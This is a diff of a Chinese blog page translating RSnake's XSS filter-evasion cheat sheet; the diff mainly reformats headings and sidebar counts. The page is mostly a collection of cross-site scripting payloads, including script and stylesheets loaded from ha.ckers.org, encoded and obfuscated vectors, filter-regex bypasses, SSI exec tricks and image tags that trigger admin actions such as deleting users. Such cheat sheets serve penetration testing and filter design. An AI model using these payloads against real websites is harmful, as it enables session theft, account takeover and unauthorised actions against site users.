+<p>##远程样式表<br>（通过某些方式例如最简单的远程样式表，你可以在表达式类型的样式参数中嵌入xss代码）。它是仅仅工作在IE浏览器或是使用了IE渲染引擎的Netscape 8.1+。需要注意的是页面中并没有展现出它包含了javascript代码。注意：所有的远程样式表xss需要至少页面包含body标签，否则将无法工作。或者页面中包含除了向量本身外的其他内容。因此如果它是一个空白页面，你需要添加至少一个字母到页面确保它可以工作。</p>
 <pre><code>&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt;
 </code></pre><hr>
-<p>##远程样式表2##<br>原理与上面相同。但是使用了STYLE标签代替LINK标签。与此向量稍有不同的变异型曾被用于攻击Google Desktop。你也可以移除&#x3C;/STYLE&gt;标签让后面的html去闭合它。在不允许输入等号或是反斜杠的实际环境中这个向量是有用的。</p>
+<p>##远程样式表2<br>原理与上面相同。但是使用了STYLE标签代替LINK标签。与此向量稍有不同的变异型曾被用于攻击Google Desktop。你也可以移除&#x3C;/STYLE&gt;标签让后面的html去闭合它。在不允许输入等号或是反斜杠的实际环境中这个向量是有用的。</p>
 <pre><code>&lt;STYLE&gt;@import&apos;http://ha.ckers.org/xss.css&apos;;&lt;/STYLE&gt;
 </code></pre><hr>
-<p>##远程样式表3##<br>它仅仅可以工作在 Opera 8.0 (no longer in 9.x) ，但它是非常的阴险。根据RFC2616规定，设置一个http头不是 HTTP1.1 规定的一部分，但是很多浏览器仍然允许它（例如Firefox and Opera）。这个技巧是我们可以设置一个http头（与常规http头没有什么不同，除了 Link: <a href="http://ha.ckers.org/xss.css" target="_blank" rel="external">http://ha.ckers.org/xss.css</a>; REL=stylesheet）。这样带有xss代码的远程向量将运行javascript。它不被支持在 FireFox。</p>
+<p>##远程样式表3<br>它仅仅可以工作在 Opera 8.0 (no longer in 9.x) ，但它是非常的阴险。根据RFC2616规定，设置一个http头不是 HTTP1.1 规定的一部分，但是很多浏览器仍然允许它（例如Firefox and Opera）。这个技巧是我们可以设置一个http头（与常规http头没有什么不同，除了 Link: <a href="http://ha.ckers.org/xss.css" target="_blank" rel="external">http://ha.ckers.org/xss.css</a>; REL=stylesheet）。这样带有xss代码的远程向量将运行javascript。它不被支持在 FireFox。</p>
 <pre><code>&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;
 </code></pre><hr>
-<p>##远程样式表4##<br>它是仅仅工作在 Gecko 渲染引擎。并且需要绑定一个 XUL文件在页面。令人讽刺的是Netscape认为Gecko是更加安全的，因此绝大多是网站会受到这个攻击。</p>
+<p>##远程样式表4<br>它是仅仅工作在 Gecko 渲染引擎。并且需要绑定一个 XUL文件在页面。令人讽刺的是Netscape认为Gecko是更加安全的，因此绝大多是网站会受到这个攻击。</p>
 <pre><code>&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;
 </code></pre><hr>
-<p>##分隔javascript在STYLE标签##<br>这个xss在ie浏览器中会造成无线循环的弹窗</p>
+<p>##分隔javascript在STYLE标签<br>这个xss在ie浏览器中会造成无线循环的弹窗</p>
 <pre><code>&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;
 </code></pre><hr>
-<p>##STYLE属性中使用注释去分隔表达式##<br>提出被 Roman Ivanov</p>
+<p>##STYLE属性中使用注释去分隔表达式<br>提出被 Roman Ivanov</p>
 <pre><code>&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt;
 </code></pre><hr>
-<p>##IMG样式的表达式##<br>这是上面xss向量的混合体。不过它展示了STYLE标签被分隔有多困难。同样它也会在ie下造成循环弹窗。</p>
+<p>##IMG样式的表达式<br>这是上面xss向量的混合体。不过它展示了STYLE标签被分隔有多困难。同样它也会在ie下造成循环弹窗。</p>
 <pre><code>exp/*&lt;A STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);
 xss:ex/*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;
 </code></pre><hr>
-<p>##STYLE标签（仅支持老版本的Netscape）##</p>
+<p>##STYLE标签（仅支持老版本的Netscape）</p>
 <pre><code>&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;
 </code></pre><hr>
-<p>##使用background-image的style标签##</p>
+<p>##使用background-image的style标签</p>
 <pre><code>&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
 </code></pre><hr>
-<p>##使用background的style标签##</p>
+<p>##使用background的style标签</p>
 <pre><code>&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)}&lt;/STYLE&gt;
 </code></pre><hr>
-<p>##匿名html标签的属性##<br>IE6.0 和使用了ie渲染引擎的Netscape 8.1+ 并不会关心你创建的html标签存在与否。只要它是以尖括号以及字符开始的。</p>
+<p>##匿名html标签的属性<br>IE6.0 和使用了ie渲染引擎的Netscape 8.1+ 并不会关心你创建的html标签存在与否。只要它是以尖括号以及字符开始的。</p>
 <pre><code>&lt;XSS STYLE=&quot;xss:expression(alert(&apos;XSS&apos;))&quot;&gt;
 </code></pre><hr>
-<p>##本地 htc 文件##<br>它有一个小的不同与上面的xss向量，因为他使用的 htc 文件必须是当前域的文件。这个文件通过样式属性引入并运行javascript代码实现xss。</p>
+<p>##本地 htc 文件<br>它有一个小的不同与上面的xss向量，因为他使用的 htc 文件必须是当前域的文件。这个文件通过样式属性引入并运行javascript代码实现xss。</p>
 <pre><code>&lt;XSS STYLE=&quot;behavior: url(xss.htc);&quot;&gt;
 </code></pre><hr>
-<p>##US-ASCII编码##<br>US-ASCII 编码 (发现被 Kurt Huwig)。它是使用畸形的ASCII 编码用7bits代替8bits. 这个xss可以绕过绝大多数内容过滤，但是必须当前域的传输形式为 US-ASCII编码方式。或者你自己将当前页面设置为种编码方式 。它是更加有用的去绕过web应用防火墙xss过滤比服务器端的过滤。Apache的 Tomcat是众所周知的 使用US-ASCII编码传输协议。</p>
+<p>##US-ASCII编码<br>US-ASCII 编码 (发现被 Kurt Huwig)。它是使用畸形的ASCII 编码用7bits代替8bits. 这个xss可以绕过绝大多数内容过滤，但是必须当前域的传输形式为 US-ASCII编码方式。或者你自己将当前页面设置为种编码方式 。它是更加有用的去绕过web应用防火墙xss过滤比服务器端的过滤。Apache的 Tomcat是众所周知的 使用US-ASCII编码传输协议。</p>
 <pre><code>¼script¾alert(¢XSS¢)¼/script¾
 </code></pre><hr>
-<p>##META##<br>关于meta refresh比较奇怪的是它并不会发送一个刷新请求头。因此它通常用于那些不需要引用url的攻击。</p>
+<p>##META<br>关于meta refresh比较奇怪的是它并不会发送一个刷新请求头。因此它通常用于那些不需要引用url的攻击。</p>
 <pre><code>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;
 </code></pre><hr>
-<p>##META using data##<br> URL指令方案是非常的不错，因为它没有明显的SCRIPT单词或是JavaScript 指令出现，而是使用了base64 编码。请查看 <a href="https://tools.ietf.org/html/rfc2397" target="_blank" rel="external">RFC 2397</a>了解更多信息或是编码你的代码。你也可以使用 <a href="http://ha.ckers.org/xsscalc.html" target="_blank" rel="external">XSS calculator</a>去编码你的html或是javascript代码到base64编码。</p>
+<p>##META using data<br> URL指令方案是非常的不错，因为它没有明显的SCRIPT单词或是JavaScript 指令出现，而是使用了base64 编码。请查看 <a href="https://tools.ietf.org/html/rfc2397" target="_blank" rel="external">RFC 2397</a>了解更多信息或是编码你的代码。你也可以使用 <a href="http://ha.ckers.org/xsscalc.html" target="_blank" rel="external">XSS calculator</a>去编码你的html或是javascript代码到base64编码。</p>
 <pre><code>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;
 </code></pre><hr>
-<p>##额外url参数的META##<br>如果当前网页试图去查找URL参数是否以”http://“ 开始，你可以用下列技术绕过（被 Moritz Naumann提出）</p>
+<p>##额外url参数的META<br>如果当前网页试图去查找URL参数是否以”http://“ 开始，你可以用下列技术绕过（被 Moritz Naumann提出）</p>
 <pre><code>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&apos;XSS&apos;);&quot;&gt;
 </code></pre><hr>
-<p>##IFRAME##<br>如果一个iframes被允许，那么同时可能会存在大量其他xss问题</p>
+<p>##IFRAME<br>如果一个iframes被允许，那么同时可能会存在大量其他xss问题</p>
 <pre><code>&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;
 </code></pre><hr>
-<p>##IFRAME 基于事件##<br>IFrames或其他元素可以使用事件如下（提出被 David Cross）</p>
+<p>##IFRAME 基于事件<br>IFrames或其他元素可以使用事件如下（提出被 David Cross）</p>
 <pre><code>&lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&gt;&lt;/IFRAME&gt;
 </code></pre><hr>
-<p>##FRAME##<br>Frames有一系列像iframes一样的问题</p>
+<p>##FRAME<br>Frames有一系列像iframes一样的问题</p>
 <pre><code>&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;
 </code></pre><hr>
-<p>##TABLE##</p>
+<p>##TABLE</p>
 <pre><code>&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;
 </code></pre><hr>
-<p>##TD##<br>像上面一样，TD也可以通过 BACKGROUND 来包含javascript xss向量 </p>
+<p>##TD<br>像上面一样，TD也可以通过 BACKGROUND 来包含javascript xss向量 </p>
 <pre><code>&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;
 </code></pre><hr>
-<p>##DIV background-image##</p>
+<p>##DIV background-image</p>
 <pre><code>&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;
 </code></pre><hr>
-<p>##使用 unicoded编码xss利用代码在DIV background-image##<br>它是被轻微的修改去混淆 url 参数。最早被发现被 Renaud Lifchitz用于攻击hotmail。<br>    <div style="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"></div></p>
+<p>##使用 unicoded编码xss利用代码在DIV background-image<br>它是被轻微的修改去混淆 url 参数。最早被发现被 Renaud Lifchitz用于攻击hotmail。<br>    <div style="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"></div></p>
 <hr>
-<p>##附加额外字符在DIV background-image##<br>Rnaske开发了一个XSS fuzzer去探测可以在开括号和javascript之间加入哪些额外字符在 IE和安全模式下的 Netscape 8.1。这里都是一些十进制的字符，但是你也可以用十六进制来填充。（下面这些编码字符可以被使用：1-32, 34, 39, 160, 8192-8.13, 12288, 65279）</p>
+<p>##附加额外字符在DIV background-image<br>Rnaske开发了一个XSS fuzzer去探测可以在开括号和javascript之间加入哪些额外字符在 IE和安全模式下的 Netscape 8.1。这里都是一些十进制的字符，但是你也可以用十六进制来填充。（下面这些编码字符可以被使用：1-32, 34, 39, 160, 8192-8.13, 12288, 65279）</p>
 <pre><code>&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;
 </code></pre><hr>
-<p>##DIV expression##<br>在冒号和表达式之间添加换行符是一个更加有效的去绕过实际的xss过滤器的表达式变体。</p>
+<p>##DIV expression<br>在冒号和表达式之间添加换行符是一个更加有效的去绕过实际的xss过滤器的表达式变体。</p>
 <pre><code>&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;
 </code></pre><hr>
-<p>##html条件选择注释块##<br>只能工作在IE5.0 以及更高版或是使用了ie渲染引擎的Netscape 8.1 。 一些网站认为任何包裹在注释中的内容都是安全的，因此它们并不会被移除。这将使我们的xss向量可使用。或者系统可能对某些内容添加注释去试图无害的渲染它。如我们所见，这有时并不起作用。</p>
+<p>##html条件选择注释块<br>只能工作在IE5.0 以及更高版或是使用了ie渲染引擎的Netscape 8.1 。 一些网站认为任何包裹在注释中的内容都是安全的，因此它们并不会被移除。这将使我们的xss向量可使用。或者系统可能对某些内容添加注释去试图无害的渲染它。如我们所见，这有时并不起作用。</p>
 <pre><code>&lt;!--[if gte IE 4]&gt;
 &lt;SCRIPT&gt;alert(&apos;XSS&apos;);&lt;/SCRIPT&gt;
 &lt;![endif]--&gt;
 </code></pre><hr>
-<p>##BASE标签##<br>工作在ie或是使用了安全模块的Netscape 8.1，你需要使用 “//“去避免javascript错误。它需要当前网站使用相对路径（例如images/image.jpg）而非绝对路径。如果路径开始用一个斜杠（例如”/images/image.jpg”），你需要去掉xss向量中的一个斜杠（只有在两个斜杠的情况下才会起到注释作用）</p>
+<p>##BASE标签<br>工作在ie或是使用了安全模块的Netscape 8.1，你需要使用 “//“去避免javascript错误。它需要当前网站使用相对路径（例如images/image.jpg）而非绝对路径。如果路径开始用一个斜杠（例如”/images/image.jpg”），你需要去掉xss向量中的一个斜杠（只有在两个斜杠的情况下才会起到注释作用）</p>
 <pre><code>&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;
 </code></pre><hr>
-<p>##OBJECT标签##<br>如果允许object标签，那么你也可以注入病毒payloads去感染用户。类似于APPLET标签。下面这个链接文件是一个包含xss代码的html文件。</p>
+<p>##OBJECT标签<br>如果允许object标签，那么你也可以注入病毒payloads去感染用户。类似于APPLET标签。下面这个链接文件是一个包含xss代码的html文件。</p>
 <pre><code>&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;
 </code></pre><hr>
-<p>##使用一个你可以载入包含有xss代码的flash文件的 EMBED 标签##<br>点击这个demo，如果你加入属性allowScriptAccess=”never” and allownetworking=”internal”，则可以缓解这个风险（谢谢Jonathan Vanasco 提供的这个信息）</p>
+<p>##使用一个你可以载入包含有xss代码的flash文件的 EMBED 标签<br>点击这个demo，如果你加入属性allowScriptAccess=”never” and allownetworking=”internal”，则可以缓解这个风险（谢谢Jonathan Vanasco 提供的这个信息）</p>
 <pre><code>&lt;EMBED SRC=&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot; type=&quot;image/svg+xml&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;
 </code></pre><hr>
-<p>##在flash中使用ActionScript可以混淆你的xss向量##</p>
+<p>##在flash中使用ActionScript可以混淆你的xss向量</p>
 <pre><code>a=&quot;get&quot;;
 b=&quot;URL(\&quot;&quot;;
 c=&quot;javascript:&quot;;
@@ -784,40 +783,40 @@ eval(a+b+c+d);
 <pre><code>&lt;XML SRC=&quot;xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;
 &lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
 </code></pre><hr>
-<p>##使用XML数据岛生成含有javascript代码的当前域xml文件##<br>它是相同的同上面仅仅代替XML文件为当前域文件。你可以看到结果在下面。</p>
+<p>##使用XML数据岛生成含有javascript代码的当前域xml文件<br>它是相同的同上面仅仅代替XML文件为当前域文件。你可以看到结果在下面。</p>
 <pre><code>&lt;XML SRC=&quot;xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;
 &lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
 </code></pre><hr>
-<p>##HTML+TIME 在XML中##<br>它展示了 Grey Magic 曾将是怎样攻击 Hotmail 和 Yahoo!的。它是仅仅可以工作在ie和使用了ie渲染引擎的Netscape 8.1。并且这段代码需要放在html与body标签之间。</p>
+<p>##HTML+TIME 在XML中<br>它展示了 Grey Magic 曾将是怎样攻击 Hotmail 和 Yahoo!的。它是仅仅可以工作在ie和使用了ie渲染引擎的Netscape 8.1。并且这段代码需要放在html与body标签之间。</p>
 <pre><code>&lt;HTML&gt;&lt;BODY&gt;
 &lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&gt;
 &lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt;
 &lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;
 &lt;/BODY&gt;&lt;/HTML&gt;
 </code></pre><hr>
-<p>##简单的修改字符去绕过过滤器对 “.js”的过滤##<br>在xss向量你可以重命名你的javascript文件为一个图片</p>
+<p>##简单的修改字符去绕过过滤器对 “.js”的过滤<br>在xss向量你可以重命名你的javascript文件为一个图片</p>
 <pre><code>&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;
 </code></pre><hr>
-<p>##SSI (服务器端包含)##<br>这需要SSI被安装在服务器端去使用这个xss向量。但可能我并不需要提及这点，因为如果你可以运行命令在服务器端，那么毫无疑问会有更加严重的问题存在。</p>
+<p>##SSI (服务器端包含)<br>这需要SSI被安装在服务器端去使用这个xss向量。但可能我并不需要提及这点，因为如果你可以运行命令在服务器端，那么毫无疑问会有更加严重的问题存在。</p>
 <pre><code>&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCR&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;IPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;
 </code></pre><hr>
-<p>##PHP##<br>需要php被安装在服务器端去使用这个xss向量。同样的，如果你可以运行任何远程脚本，那么将会有更加严重的问题。</p>
+<p>##PHP<br>需要php被安装在服务器端去使用这个xss向量。同样的，如果你可以运行任何远程脚本，那么将会有更加严重的问题。</p>
 <pre><code>&lt;? echo(&apos;&lt;SCR)&apos;;
 echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;
 </code></pre><hr>
-<p>##嵌入命令的IMG##<br>它是用于那些需要用户认证后才可以访问的页面，并且在访问这些页面的过程中会执行某些命令。因此它将可以创建或删除用户（如果访问者是管理员），或是寄送某些凭证等等，虽然它是较少被使用但是是非常有用的。</p>
+<p>##嵌入命令的IMG<br>它是用于那些需要用户认证后才可以访问的页面，并且在访问这些页面的过程中会执行某些命令。因此它将可以创建或删除用户（如果访问者是管理员），或是寄送某些凭证等等，虽然它是较少被使用但是是非常有用的。</p>
 <pre><code>&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;
 </code></pre><hr>
-<p>##嵌入命令的IMG II##<br>这是更加的可怕，因为并没有特别的标识符去鉴别它是否可疑。除非不允许引入第三方域的图片。这个向量是使用一个 302 or 304（或其他可行方案）去重定向一个图片地址为带有某些命令的地址。因此一个正常的图片标签代码&lt;IMG SRC=”a.jpg”&gt;可以是带有命令的xss向量。但是用户看到的仅仅是正常的图片链接地址。下面是一个.htaccess（apche下）配置文件去完成这个向量。（感谢Timo为这部分。）</p>
+<p>##嵌入命令的IMG II<br>这是更加的可怕，因为并没有特别的标识符去鉴别它是否可疑。除非不允许引入第三方域的图片。这个向量是使用一个 302 or 304（或其他可行方案）去重定向一个图片地址为带有某些命令的地址。因此一个正常的图片标签代码&lt;IMG SRC=”a.jpg”&gt;可以是带有命令的xss向量。但是用户看到的仅仅是正常的图片链接地址。下面是一个.htaccess（apche下）配置文件去完成这个向量。（感谢Timo为这部分。）</p>
 <pre><code>Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
 </code></pre><hr>
-<p>##Cookie篡改##<br>这是公认的不着边际，但是我已经发下一个例子是用 &lt;META 去覆盖cookie。另一个例子是有些网站使用cookie中的某些数据去呈现在当前访问者的网页中为仅仅他自己而不是从远程数据库中获取。当这两个清静联系在一起的时候，你可以通过修改cookie让javascript输入到用户页面中。（你可以借此让用户退出，改变用户的状态，甚至让用户以你的身份登录）</p>
+<p>##Cookie篡改<br>这是公认的不着边际，但是我已经发下一个例子是用 &lt;META 去覆盖cookie。另一个例子是有些网站使用cookie中的某些数据去呈现在当前访问者的网页中为仅仅他自己而不是从远程数据库中获取。当这两个清静联系在一起的时候，你可以通过修改cookie让javascript输入到用户页面中。（你可以借此让用户退出，改变用户的状态，甚至让用户以你的身份登录）</p>
 <pre><code>&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;
 </code></pre><hr>
-<p>##UTF-7编码##<br>如果存在xss的页面没有包含页面charset header，或是对于任何被设为UTF-7 的浏览器，我们可以利用下面的代码。（感谢Roman Ivanov 的提供），点击这儿为这个例子。（如果页面设置是自动识别编码且content-types 没有被覆盖，在ie浏览器或使用了IE渲染引擎的 Netscape 8.1，则你不需要声明 charset ）在没有改变编码的情况下它是不能工作在任何现代浏览器，这也是为什么它被标记为完全不支持。Watchfire发现这个漏洞在Google的 自定义 404 脚本中.</p>
+<p>##UTF-7编码<br>如果存在xss的页面没有包含页面charset header，或是对于任何被设为UTF-7 的浏览器，我们可以利用下面的代码。（感谢Roman Ivanov 的提供），点击这儿为这个例子。（如果页面设置是自动识别编码且content-types 没有被覆盖，在ie浏览器或使用了IE渲染引擎的 Netscape 8.1，则你不需要声明 charset ）在没有改变编码的情况下它是不能工作在任何现代浏览器，这也是为什么它被标记为完全不支持。Watchfire发现这个漏洞在Google的 自定义 404 脚本中.</p>
 <pre><code>&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&apos;XSS&apos;);+ADw-/SCRIPT+AD4-
 </code></pre><hr>
-<p>##使用HTML 引用封装的xss##<br>它是被测试在ie，具体因情况而异。这个向量是为了绕过那些可以输入 “&lt;SCRIPT&gt;” 但不允许输入 “&lt;SCRIPT SRC…”，通过正则”/&lt;script[^&gt;]+src/i”进行过滤的xss过滤器。</p>
+<p>##使用HTML 引用封装的xss<br>它是被测试在ie，具体因情况而异。这个向量是为了绕过那些可以输入 “&lt;SCRIPT&gt;” 但不允许输入 “&lt;SCRIPT SRC…”，通过正则”/&lt;script[^&gt;]+src/i”进行过滤的xss过滤器。</p>
 <pre><code>&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;
 </code></pre><p>为了执行xss代码在那些允许输入”&lt;SCRIPT&gt;” 但不允许 “&lt;script src…”（通过正则拼配”/&lt;script((\s+\w+(\s<em>=\s</em>(?:”(.)<em>?”|’(.)</em>?’|[^’”&gt;\s]+))?)+\s<em>|\s</em>)src/i”来过滤）   这个是重要的，因为我已经看到这个正则在实际环境中被使用。  </p>
 <pre><code>&lt;SCRIPT =&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
@@ -831,7 +830,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;
 <pre><code>&lt;SCRIPT a=&quot;&gt;&apos;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
 </code></pre><p>这xss仍然让我担心， as it would be nearly impossible to stop this without blocking all active content:</p>
 <pre><code>&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-</code></pre><p>##URL 字符串绕过##<br>这里假设 “<a href="http://www.google.com/" target="_blank" rel="external">http://www.google.com/</a>“ 这种形式的url在语法上是不被过滤器允许的。</p>
+</code></pre><p>##URL 字符串绕过<br>这里假设 “<a href="http://www.google.com/" target="_blank" rel="external">http://www.google.com/</a>“ 这种形式的url在语法上是不被过滤器允许的。</p>
 <p><strong>IP代替域名</strong></p>
 <pre><code>&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;
 </code></pre><p><strong>URL 编码</strong></p>
@@ -862,7 +861,7 @@ tt    p://6    6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;
 </code></pre><p><strong>针对内容替换的攻击向量</strong><br>这里假设 “<a href="http://www.google.com/" target="_blank" rel="external">http://www.google.com/</a>“ 这种链接会被替换为空。我确实有一个去针对特殊文字过滤的简单的攻击向量。这是一个例子去帮助创建向量。（IE: “java&#x09;script:” 被替换为”java    script:”, 它是仍可以工作在 IE和使用安全模块的 Netscape 8.1+ 和 Opera）</p>
 <pre><code>&lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;
 </code></pre><hr>
-<p>##字符编码表##<br>最后附上 “&lt;” 在html或是javascript中所有可能的编码形式。它们绝大多数是无法正常被渲染的，但是可以在上文中某些情景下得到渲染。</p>
+<p>##字符编码表<br>最后附上 “&lt;” 在html或是javascript中所有可能的编码形式。它们绝大多数是无法正常被渲染的，但是可以在上文中某些情景下得到渲染。</p>
 <pre><code>&lt;
 %3C
 &amp;lt
@@ -934,11 +933,11 @@ tt    p://6    6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;
 \u003c
 \u003C
 </code></pre><hr>
-<p>##字符编码和ip混淆器##<br>下面网站中包含了对xss有用的各种基本转换器。<br><a href="http://ha.ckers.org/xsscalc.html" target="_blank" rel="external">http://ha.ckers.org/xsscalc.html</a></p>
+<p>##字符编码和ip混淆器<br>下面网站中包含了对xss有用的各种基本转换器。<br><a href="http://ha.ckers.org/xsscalc.html" target="_blank" rel="external">http://ha.ckers.org/xsscalc.html</a></p>
 <hr>
-<p>##作者和主编##<br>Robert “RSnake” Hansen</p>
+<p>##作者和主编<br>Robert “RSnake” Hansen</p>
 <hr>
-<p>##翻译##<br>老道( dao#yiye.me )</p>
+<p>##翻译<br>老道( dao#yiye.me )</p>
 
       
     </div>
@@ -980,6 +979,10 @@ tt    p://6    6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/11/01/Windows补丁信息查询利用方法/" rel="prev" title="Windows补丁信息查询利用方法">
+                Windows补丁信息查询利用方法 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -1059,7 +1062,7 @@ tt    p://6    6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;
             
               <a href="/archives/">
             
-                <span class="site-state-item-count">4</span>
+                <span class="site-state-item-count">6</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -1072,7 +1075,7 @@ tt    p://6    6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-count">4</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -1208,7 +1211,7 @@ tt    p://6    6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">|	博客全站共11.5k字</span>
+  <span class="post-count">|	博客全站共12.1k字</span>
 </div>
 
         
